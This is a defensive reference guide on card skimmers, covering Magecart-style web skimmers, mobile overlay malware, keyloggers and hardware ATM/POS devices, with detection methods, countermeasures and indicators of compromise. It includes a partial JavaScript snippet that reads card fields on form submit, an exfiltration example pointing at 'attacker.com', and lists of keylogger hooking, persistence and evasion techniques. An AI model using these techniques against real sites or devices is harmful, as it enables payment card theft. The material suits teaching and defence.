# Digital Skimmer Analysis & Defense — Full Reference

## Table of Contents
1. [Skimmer Taxonomy](#1-skimmer-taxonomy)
2. [JavaScript Skimmers (Magecart-style)](#2-javascript-skimmers)
3. [Android/iOS Mobile Skimmers](#3-mobile-skimmers)
4. [Windows/Mac Keyloggers](#4-keyloggers)
5. [Hardware/POS Skimmers](#5-pos-skimmers)
6. [Detection & Defense Framework](#6-detection)
7. [Countermeasures](#7-countermeasures)

---

## 1. Skimmer Taxonomy

### Attack Surface Matrix

| Layer | Target | Delivery | Exfiltration | Detection Difficulty |
|-------|--------|----------|--------------|---------------------|
| Web (JS) | Checkout pages | Compromised CDN, XSS, supply chain | HTTPS POST to attacker domain | Medium |
| Mobile (Android/iOS) | Payment apps, browsers | Malicious apps, sideloading, overlay | SMS, HTTPS, DNS tunneling | High |
| Desktop (Win/Mac) | Browsers, banking apps | Phishing, trojanized software | Encrypted C2 channel | Medium |
| Hardware (POS) | Card terminals | Physical tampering, insider | Bluetooth, cellular, manual retrieval | Very High |
| Network (MITM) | All transactions | ARP spoofing, rogue WiFi | Direct interception | Medium |

### Threat Actor Profiles

**Magecart Groups:**
- Group 1: Targeted, manual compromise, custom JS
- Group 2: Supply chain attacks (compromised JS libraries)
- Group 3: Mass-scanning, automated injection
- Group 4: AJAX-based, persistent backdoors

**Mobile Skimmer Operators:**
- Malicious app developers (fake apps on Play Store)
- SDK poisoning (malicious ad libraries)
- Overlay attackers (screen capture on banking apps)

---

## 2. JavaScript Skimmers (Magecart-style)

### How They Work

**Stage 1: Injection**
```
1. Attacker compromises website (CDN, CMS, supply chain)
2. Malicious JS injected into <head> or before </body>
3. Code loads asynchronously to avoid detection
```

**Stage 2: Data Harvesting**
```javascript
// Conceptual (for detection purposes):
// 1. Intercept form submissions
document.querySelector('form').addEventListener('submit', function(e) {
    var data = {
        card: document.getElementById('card-number').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value
    };
    // Exfiltrate via fetch/Image/beacon
});

// 2. Monitor input events
document.querySelectorAll('input').forEach(function(input) {
    input.addEventListener('blur', function() {
        // Capture field values
    });
});

// 3. Hook into payment gateways (Stripe, Braintree)
// Intercept tokenization calls
```

**Stage 3: Exfiltration Channels**
- `fetch()` / `XMLHttpRequest` to attacker domain
- `<img src="https://attacker.com/log?d=ENCRYPTED_DATA">`
- `navigator.sendBeacon()` (survives page close)
- WebSocket to persistent C2 channel
- Steganography in image uploads
- DNS tunneling via subdomain queries

**Stage 4: Evasion Techniques**
- Domain rotation (DGA — domain generation algorithms)
- Code obfuscation (packers, eval, base64)
- Execution delay (wait 5-30 seconds after page load)
- Geo-firing (only active for target regions)
- Only trigger during business hours
- Avoid sandbox detection (check for DevTools)
- Self-delete after execution
- MutationObserver to re-inject if removed

### Real-World Examples

**British Airways Attack (2018):**
- Compromised Modernizr script
- 381,000 payment cards stolen
- Exfiltrated via "baways.com" domain (typosweet)

**Ticketmaster Attack (2018):**
- Malicious code in payment page iframe
- Injected via compromised third-party chat widget
- 40,000 customers affected

**Magecart Group 6 — Polyglot Images:**
- Exfiltrated data hidden in PNG files
- `onerror` trigger loads stolen data from image metadata

### Detection Signatures

**Static Indicators:**
- Suspicious `<script>` tags with:
  - External domains not in CSP whitelist
  - Obfuscated/packed code (eval, atob, unescape)
  - New domains (<30 days old)
  - Domains similar to target (typosquat)
  - Data URIs with encoded payloads
  - Dynamic script injection (`document.createElement('script')`)

**Behavioral Indicators:**
- Network requests to unknown domains after form interaction
- `MutationObserver` on payment forms
- Event listeners on sensitive input fields
- Access to `localStorage`/`sessionStorage` with card-like data
- Clipboard access (`navigator.clipboard`)

**Runtime Indicators:**
- Modified `XMLHttpRequest` prototype
- Hooked `fetch` API
- Intercepted `addEventListener` on form elements
- Suspicious WebAssembly modules

---

## 3. Mobile Skimmers (Android/iOS)

### Android Skimmers

**Architecture:**
```
┌─────────────────────────────────────┐
│         Legitimate App              │
│  ┌───────────────────────────────┐  │
│  │   Payment Form (WebView)      │  │
│  │   ┌─────────────────────────┐ │  │
│  │   │ Malicious JS Injection  │ │  │
│  │   │ (via compromised ad SDK)│ │  │
│  │   └─────────────────────────┘ │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│   Overlay Attack (Accessibility)    │
│  - Fake input fields on top of     │
│    legitimate banking app           │
│  - Captures real credentials       │
└─────────────────────────────────────┘
```

**Delivery Mechanisms:**
1. Malicious SDK in legitimate apps (ad networks)
2. Trojanized apps on Play Store/third-party stores
3. Overlay malware (Cerberus, Alien, Anatsa)
4. SMS-based phishing to install malicious APK
5. Exploit-based installation (Drive-by download)

**Known Android Skimmer Malware:**

| Malware | Technique | Target | Status |
|---------|-----------|--------|--------|
| Cerberus | Overlay + keylogger + RAT | 17 banking apps | Active |
| Alien | Overlay + form grabber | 200+ apps | Active |
| Anatsa | Dropper + form grabber | US banks | Active |
| ERMAC | VNC + form grabber | 370+ apps | Active |
| Hydra | Overlay + cookie theft | EU banks | Active |
| Godfather | WebView hijacking | 400+ apps | Active |

**Android Skimmer Capabilities:**
- Screen recording (MediaProjection API)
- Keylogging (AccessibilityService abuse)
- Overlay injection (TYPE_APPLICATION_OVERLAY)
- SMS interception (broadcast receiver)
- 2FA token theft (notification listener)
- Remote control (VNC/RAT)
- Dynamic configuration (C2 updates targets)

### iOS Skimmers

**Architecture:**
- Limited by iOS sandboxing
- Primarily delivered via:
  - Enterprise certificate abuse
  - Jailbreak-only apps
  - Malicious configuration profiles
  - Compromised Xcode projects (XcodeGhost-style)

**iOS Skimmer Techniques:**
- Jailbreak-only keyloggers (via Cydia)
- Malicious dynamic libraries injected at runtime
- Phishing web clips (fake banking pages)
- Enterprise app abuse (sideloaded malware)
- Zero-click exploits (NSO Group-style)

---

## 4. Keyloggers (Windows/Mac/Linux)

### Windows Keyloggers

**User-Mode Techniques:**
1. **Global Hook (SetWindowsHookEx)**
   - `WH_KEYBOARD_LL` — low-level keyboard hook
   - Requires message loop in DLL
   - Easily detected by security products

2. **Polling (GetAsyncKeyState)**
   - Check every key state in a loop
   - No hook required
   - High CPU usage, easily detected

3. **Raw Input Device (RegisterRawInputDevices)**
   - Register as raw input consumer
   - Stealthier than hooks
   - Requires foreground window check

4. **Kernel-Mode Driver**
   - Filter driver in keyboard stack
   - Requires driver signing (DSE bypass)
   - Extremely stealthy, high privilege

5. **Direct Input (DirectX)**
   - Hook DirectInput API
   - Targets games specifically
   - Bypasses some security products

**Persistence Mechanisms:**
- Registry Run keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`)
- Scheduled tasks
- WMI event subscriptions
- COM hijacking
- Service creation
- Winlogon notification packages
- AppInit_DLLs
- Image File Execution Options (IFEO)

**Evasion Techniques:**
- Process hollowing (suspend legitimate process, replace memory)
- Process doppelgänging (NTFS transaction abuse)
- Process herding (parent PID spoofing)
- Module stomping (overwrite legitimate DLL in memory)
- APC injection
- Thread hijacking
- Reflective DLL loading

### macOS Keyloggers

**Techniques:**
1. **CGEventTap**
   - Create event tap at session level
   - Requires Accessibility permissions
   - Detected by TCC prompts

2. **IOKit**
   - Kernel-level keyboard access
   - Requires root + SIP bypass
   - Extremely stealthy

3. **Input Method Editor (IME)**
   - Custom keyboard layout
   - Appears legitimate to users
   - No permissions required

### Linux Keyloggers

**Techniques:**
1. **evdev (/dev/input/event*)**
   - Read raw input device events
   - Requires root
   - Simple and reliable

2. **X11 Record Extension**
   - XRecord extension for X11
   - User-level access
   - Doesn't work on Wayland

3. **uinput (Userspace Input)**
   - Create virtual input device
   - Intercept via uinput module
   - Requires uinput group

4. **eBPF (Extended Berkeley Packet Filter)**
   - Kernel-level tracing
   - Modern, powerful, hard to detect
   - Requires root + BPF privileges

### Exfiltration Methods for Keyloggers

1. **Email** (SMTP direct or via API)
2. **HTTP/HTTPS POST** to C2 server
3. **DNS tunneling** (encode data in subdomain queries)
4. **File sharing** (Dropbox, Google Drive, OneDrive API)
5. **Pastebin/Telegram** (abuse legitimate services)
6. **Bluetooth** (for hardware-implanted keyloggers)
7. **Physical** (WiFi-based exfiltration from air-gapped systems)

---

## 5. Hardware/POS Skimmers

### ATM Skimmers

**Components:**
1. **Card Reader Overlay**
   - Fits over legitimate card slot
   - Reads magnetic stripe data
   - Contains flash memory or Bluetooth transmitter

2. **Pinhole Camera**
   - Hidden in fascia or brochure holder
   - Records PIN entry
   - Transmits via Bluetooth/cellular

3. **Fake Keypad**
   - Placed over real keypad
   - Records PIN presses directly
   - Contains memory chip

4. **Shimmer (Chip Skimmer)**
   - Ultra-thin device inserted INTO card reader
   - Intercepts EMV chip communication
   - Reads card data during legitimate transaction

**Detection Methods:**
- Physical inspection (wiggle test, compare to known-good)
- Bluetooth scanning (Flipper Zero, Ubertooth)
- RF detection (spectrum analysis)
- Network traffic analysis (unexpected outbound connections)
- Tamper-evident seals

### POS Terminal Skimmers

**Types:**
1. **Bluetooth Skimmer**
   - Installed inside terminal by insider
   - Transmits data via Bluetooth to nearby receiver
   - Battery or parasitic power

2. **Cellular Skimmer**
   - GSM module inside terminal
   - Sends SMS with card data
   - Can be detected via RF scanning

3. **Deep Insert Skimmer**
   - Entirely inside terminal housing
   - Taps into internal data lines
   - No external evidence

4. **Terminal Swap**
   - Entire terminal replaced with compromised unit
   - Pre-loaded with skimming firmware
   - Hardest to detect visually

### Detection Techniques for Hardware Skimmers

1. **RF/Bluetooth Scanning**
   - Scan for unexpected Bluetooth devices near terminals
   - Look for unknown BLE advertisements
   - Detect cellular transmissions (SDR required)

2. **Tamper Detection**
   - Tamper-evident seals with unique serial numbers
   - Accelerometer-based tamper detection
   - Light sensors (detect housing opening)

3. **Firmware Verification**
   - Compare terminal firmware hash against known-good
   - Detect modified bootloaders
   - Verify secure boot chain

4. **Network Analysis**
   - Monitor for unexpected outbound connections
   - DNS query analysis for exfiltration patterns
   - Traffic baseline comparison

5. **Physical Inspection**
   - X-ray scanning (for internal components)
   - Weight comparison (skimmers add grams)
   - UV light detection (for adhesive residue)

---

## 6. Detection & Defense Framework

### Web Application Skimmer Detection

**CSP (Content Security Policy):**
```
Content-Security-Policy:
  script-src 'self' https://trusted-cdn.com;
  connect-src 'self' https://api.trusted.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

**Subresource Integrity (SRI):**
```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-abc123..."
        crossorigin="anonymous"></script>
```

**Client-Side Monitoring:**
1. Monitor `document.createElement('script')` calls
2. Detect `eval()` and `new Function()` execution
3. Watch for prototype pollution of `XMLHttpRequest`/`fetch`
4. Monitor `localStorage`/`sessionStorage` access
5. Detect `addEventListener` on sensitive form fields
6. Use MutationObserver to detect DOM changes to payment forms

**Server-Side Monitoring:**
1. File integrity monitoring (FIM) on all web assets
2. CDN integrity verification (hash comparison)
3. Detect unauthorized modifications to HTML/JS
4. Monitor outgoing network connections from web server
5. Analyze web server logs for injection attempts

### Android Malware Detection

**Static Analysis:**
1. Manifest analysis (suspicious permissions)
   - `BIND_ACCESSIBILITY_SERVICE`
   - `SYSTEM_ALERT_WINDOW` (overlay)
   - `READ_SMS`, `RECEIVE_SMS` (2FA theft)
   - `READ_LOGS` (sensitive data)
   - `INTERNET` + `ACCESS_NETWORK_STATE`

2. Code Analysis:
   - Reflection-heavy code
   - Dynamic code loading (DexClassLoader)
   - Native code (JNI) usage
   - Shell command execution
   - Encrypted strings/resources

3. Network Indicators:
   - Hardcoded IP addresses
   - DGA patterns in domain names
   - Suspicious API endpoints
   - Telegram bot tokens (common C2)

**Dynamic Analysis:**
1. Runtime behavior monitoring
2. Network traffic capture
3. File system monitoring
4. IPC/Binder transaction monitoring
5. System call tracing (strace/frida)

**Detection Tools:**
- APKStatic (automated static analysis)
- jadx (decompiled APK inspection)
- Frida (runtime instrumentation)
- Drozer (IPC attack surface analysis)
- MobSF (Mobile Security Framework)

### Windows Keylogger Detection

**Behavioral Indicators:**
1. Processes with global hooks (check with Spy++)
2. Unexpected network connections (netstat -b)
3. Suspicious DLLs loaded in processes
4. Modified keyboard class drivers (UpperFilters)
5. Unexpected scheduled tasks or run keys
6. Processes with debug privileges

**Detection Tools:**
- Process Explorer (handles, DLLs, strings)
- Autoruns (all auto-start locations)
- API Monitor (API call monitoring)
- GMER (rootkit detection)
- OSR Driver Loader (driver verification)
- WinDbg (kernel debugging)

### Keylogger Detection (Android)

**Signs of Keylogger:**
1. Battery drain (continuous key monitoring)
2. Increased network data usage
3. Device heating during idle
4. Accessibility services enabled without reason
5. Unknown apps with overlay permission
6. Keyboards that look slightly different
7. Delayed character display
8. Strange permissions in installed apps

**Android Detection Apps:**
- Keylogger detector (checks Accessibility services)
- Overlay detector (monitors TYPE_APPLICATION_OVERLAY)
- Network monitor (detects exfiltration)
- Process monitor (detects suspicious processes)

---

## 7. Countermeasures

### For Web Applications

1. **Content Security Policy** — Restrict script sources
2. **Subresource Integrity** — Verify external scripts
3. **Trusted Types** — Prevent DOM XSS
4. **Frame Ancestors** — Prevent clickjacking
5. **Permissions Policy** — Restrict browser features
6. **Client-side monitoring** — Real-time script detection
7. **Regular security audits** — Pen testing, code review
8. **WAF with bot detection** — Block automated attacks

### For Mobile (Android)

1. **Play Protect** — Enable automatic scanning
2. **Disable Unknown Sources** — No sideloading
3. **Review Accessibility Services** — Disable unnecessary
4. **Check Overlay Permissions** — Review SYSTEM_ALERT_WINDOW
5. **Use hardware security keys** — For 2FA (prevents SMS theft)
6. **Biometric authentication** — Harder to phish than passwords
7. **App verification** — Check permissions, reviews, developer

### For Windows

1. **Windows Defender Credential Guard** — Isolates secrets
2. **Windows Hello** — Biometric login (no password to capture)
3. **Secure Boot + TPM** — Prevents rootkit persistence
4. **Application Control (WDAC)** — Only signed code runs
5. **Attack Surface Reduction Rules** — Blocks common techniques
6. **Exploit Protection** — ASLR, DEP, CFG, CIG
7. **Network Protection** — Blocks malicious domains
8. **Controlled Folder Access** — Prevents ransomware

### For POS Terminals

1. **End-to-End Encryption** — Data encrypted from terminal
2. **Point-to-Point Encryption (P2PE)** — Card data encrypted at swipe
3. **Tamper-evident seals** — Visual inspection
4. **Regular physical audits** — Check all terminals
5. **Bluetooth scanning** — Detect wireless skimmers
6. **Cellular detection** — RF scanning for GSM skimmers
7. **Firmware verification** — Checksum comparison
8. **Network monitoring** — Detect unexpected outbound traffic
9. **Employee training** — Recognize tampering attempts
10. **Replace magstripe-only terminals** — EMV chip is harder to skim

---

## 8. Tools & Resources

### Open Source Detection Tools

| Tool | Purpose | Platform |
|------|---------|----------|
| Magecart Detector | Scan for JS skimmers | Web |
| Frida | Dynamic instrumentation | Android/iOS |
| MobSF | Mobile app analysis | Android/iOS |
| Process Explorer | Process inspection | Windows |
| Autoruns | Persistence detection | Windows |
| API Monitor | API call tracing | Windows |
| GMER | Rootkit detection | Windows |
| Volatility | Memory forensics | Windows/Linux/Mac |
| YARA | Pattern matching | All |
| Sigma | Log signatures | All |

### Commercial Solutions

| Vendor | Product | Coverage |
|--------|---------|----------|
| Riskified | Fraud prevention | Web |
| PerimeterX | Bot detection | Web |
| DataDome | Client-side protection | Web |
| Human Security | Magecart defense | Web |
| Zimperium | Mobile threat defense | Android/iOS |
| Lookout | Mobile security | Android/iOS |
| CrowdStrike | EDR | All |
| SentinelOne | EDR | All |

---

## 9. Indicators of Compromise (IOCs)

### Web Skimmer IOCs
- New external script tags in HTML
- Script sources with typosweet domains
- Base64-encoded JavaScript
- Obfuscated variable names
- New network connections on form submit
- DOM modifications to payment forms

### Mobile Malware IOCS
- Apps requesting Accessibility + Overlay + SMS
- Apps with no Play Store presence
- High network data usage
- Battery drain
- Unknown processes running
- Suspicious APK certificates

### Keylogger IOCs
- Global keyboard hooks
- Unexpected network connections
- Modified keyboard drivers
- Suspicious scheduled tasks
- Processes with debug privileges
- Unexpected DLLs in system processes

### Hardware Skimmer IOCs
- Unexpected Bluetooth devices near terminals
- Cellular transmissions from terminals
- Physical tampering evidence
- Firmware hash mismatches
- Unexpected network traffic from terminals

---

## 10. Legal & Ethical Framework

### Authorized Testing Only
- Written authorization required before testing
- Scope must be clearly defined
- Data handling procedures must be established
- Reporting requirements must be agreed upon

### Responsible Disclosure
- Report vulnerabilities to affected parties
- Allow reasonable time for remediation
- Do not exploit vulnerabilities for personal gain
- Follow coordinated disclosure practices

### Legal Boundaries
- Computer Fraud and Abuse Act (CFAA) — US
- General Data Protection Regulation (GDPR) — EU
- Payment Card Industry Data Security Standard (PCI DSS)
- State computer crime laws
- International cybercrime treaties

---

*This documentation is for authorized security testing and educational purposes only.*
*Understanding attack techniques is essential for building effective defenses.*
